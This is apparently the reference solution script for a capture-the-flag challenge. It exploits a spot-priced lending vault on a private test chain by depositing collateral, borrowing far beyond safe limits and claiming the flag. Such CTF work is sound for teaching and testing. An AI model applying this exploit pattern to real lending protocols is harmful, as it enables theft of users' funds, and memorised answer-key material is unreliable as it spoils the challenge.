#!/usr/bin/env node
// Reference exploit for oracle-manipulation, using sdk/index.js.
//
// Private-anvil mode. Spawn → read instance.extra → exploit on the
// player's private chain → claim. The bug isn't the manipulation:
// it's that spot-priced lending with no caps lets any depositor
// borrow up to collateral × spot at all.

import { ethers } from "ethers";
import { Ctf } from "../../../sdk/index.js";

const required = ["PLAYER_KEY", "BACKEND", "CHALLENGE"];
for (const k of required) {
  if (!process.env[k]) { console.error(`missing env ${k}`); process.exit(1); }
}

const me = new ethers.Wallet(process.env.PLAYER_KEY).address;
console.log(`player: ${me}`);

const ctf = new Ctf({
  backend: process.env.BACKEND,
  challenge: process.env.CHALLENGE,
  player: me,
});

// fetch the player's private-anvil instance (spawn first if none)
let { instance } = await ctf.getInstance();
if (!instance) {
  console.log("spawn()");
  ({ instance } = await ctf.spawn());
}
console.log(`rpc:    ${instance.rpcUrl}`);
console.log(`vault:  ${instance.target}`);
console.log(`amm:    ${instance.extra.amm}`);
console.log(`tokenA: ${instance.extra.tokenA}`);
console.log(`tokenB: ${instance.extra.tokenB}`);

const provider = new ethers.JsonRpcProvider(instance.rpcUrl);
const wallet   = new ethers.Wallet(process.env.PLAYER_KEY, provider);

const a = new ethers.Contract(instance.extra.tokenA, [
  "function approve(address,uint256) returns (bool)",
  "function balanceOf(address) view returns (uint256)",
], wallet);
const vault = new ethers.Contract(instance.target, [
  "function deposit(uint256)",
  "function borrow(uint256)",
], wallet);

const tx = p => p.then(t => t.wait());
console.log("approve vault");
await tx(a.approve(instance.target, ethers.MaxUint256));
console.log("deposit 1M A");
await tx(vault.deposit(ethers.parseEther("1000000")));
console.log("borrow 100k B");
await tx(vault.borrow(ethers.parseEther("100000")));

const { flag } = await ctf.claimFlag({ poll: 6 });
console.log(`flag: ${flag}`);
